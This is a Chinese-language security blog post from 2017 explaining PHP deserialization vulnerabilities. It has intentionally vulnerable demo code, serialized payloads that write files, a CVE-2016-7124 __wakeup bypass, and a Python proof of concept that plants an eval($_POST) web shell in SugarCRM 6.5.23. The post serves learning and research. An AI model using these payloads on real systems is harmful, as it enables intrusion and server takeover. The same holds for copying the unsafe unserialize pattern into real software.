<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 反序列化漏洞的利用与学习 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="反序列化漏洞的利用与学习 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">反序列化漏洞的利用与学习</h1><div class="post-time">Jul 28, 2017</div><div class="post-content"><h2 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p>
<h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PHP反序列化&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;test&quot;;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&apos;test&apos;];</span><br><span class="line">$test_unser = unserialize($test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>上述代码使用了php的magic方法destruct（详情参考<a href="http://php.net/manual/en/language.oop5.magic.php" target="_blank" rel="noopener">PHP: Magic Methods</a>），而destruct是当一个对象被销毁时被自动调用的析构方法。<br>然后unserialize中参数可控，这样我们就可以构造一个序列化的对象A来控制其中的变量a的值，最终会产生漏洞。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造一个序列化的对象A并给其中变量a赋值为&lt;?php phpinfo();?&gt;如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php1.png" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/php2.png" alt=""><br>如上成功将&lt;?php phpinfo();?&gt;写入1.php.</p>
<h3 id="实例利用"><a href="#实例利用" class="headerlink" title="实例利用"></a>实例利用</h3><h4 id="基础准备"><a href="#基础准备" class="headerlink" title="基础准备"></a>基础准备</h4><p>PHP之前爆出了一个漏洞（<a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a> ），简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。Demo如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;PHP&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	var $a = &quot;test&quot;;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		$fp = fopen(&quot;E:\\phpStudy\\WWW\\1.php&quot;,&quot;w&quot;);</span><br><span class="line">		fputs($fp,$this-&gt;a);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">	function __wakeup()</span><br><span class="line">    	&#123;</span><br><span class="line">        	foreach(get_object_vars($this) as $k =&gt; $v) &#123;</span><br><span class="line">            		$this-&gt;$k = null;</span><br><span class="line">        	&#125;</span><br><span class="line">        	echo &quot;Waking up...\n&quot;;</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = $_POST[&apos;test&apos;];</span><br><span class="line">$test_unser = unserialize($test);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>我们再次使用之前的payload测试，结果如下：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php3.png" alt=""><br>发现__wakeup函数成功执行，清除了对象属性，从而1.php内容也为空了。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>根据CVE-2016-7124的原理，将上面payload中A的个数变成2或者大于2的数字如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test=O:1:”A”:2:&#123;s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后再次执行发现绕过了__wakeup函数，成功将phpinfo()写入1.php<br><img src="http://obr4sfdq7.bkt.clouddn.com/php4.png" alt=""></p>
<h4 id="SugarCRM-v6-5-23-PHP反序列化"><a href="#SugarCRM-v6-5-23-PHP反序列化" class="headerlink" title="SugarCRM v6.5.23 PHP反序列化"></a>SugarCRM v6.5.23 PHP反序列化</h4><p>漏洞分析：<a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br>漏洞环境：<a href="https://github.com/sugarcrm/sugarcrm_dev/tree/6.5.23/" target="_blank" rel="noopener">SugarCRM v6.5.23</a></p>
<p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/sugarcrm_dev-6.5.23/service/v4/rest.php&apos;</span><br><span class="line"></span><br><span class="line">data = &#123;  </span><br><span class="line">    &apos;method&apos;: &apos;login&apos;,</span><br><span class="line">    &apos;input_type&apos;: &apos;Serialize&apos;,</span><br><span class="line">    &apos;rest_data&apos;: &apos;O:+14:&quot;SugarCacheFile&quot;:23:&#123;S:17:&quot;\\00*\\00_cacheFileName&quot;;s:15:&quot;../custom/1.php&quot;;S:16:&quot;\\00*\\00_cacheChanged&quot;;b:1;S:14:&quot;\\00*\\00_localStore&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[\&apos;HHH\&apos;]); ?&gt;&quot;;&#125;&#125;&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req.post(url, data=data)</span><br></pre></td></tr></table></figure></p>
<p>脚本执行后shell位于custom/1.php：<br><img src="http://obr4sfdq7.bkt.clouddn.com/php5.png" alt=""></p>
<h2 id="Java反序列化漏洞（待续）"><a href="#Java反序列化漏洞（待续）" class="headerlink" title="Java反序列化漏洞（待续）"></a>Java反序列化漏洞（待续）</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://paper.seebug.org/39/" target="_blank" rel="noopener">SugarCRM v6.5.23 PHP反序列化对象注入漏洞分析</a><br><a href="http://www.cnblogs.com/test404/p/6486435.html" target="_blank" rel="noopener">PHP反序列化漏洞与CVE-2016-7124</a></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/宽字节注入漏洞的利用与学习.html" class="prev">PREV</a><a href="/posts/notes/Web-For-Pentester-I-练习笔记.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2018 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>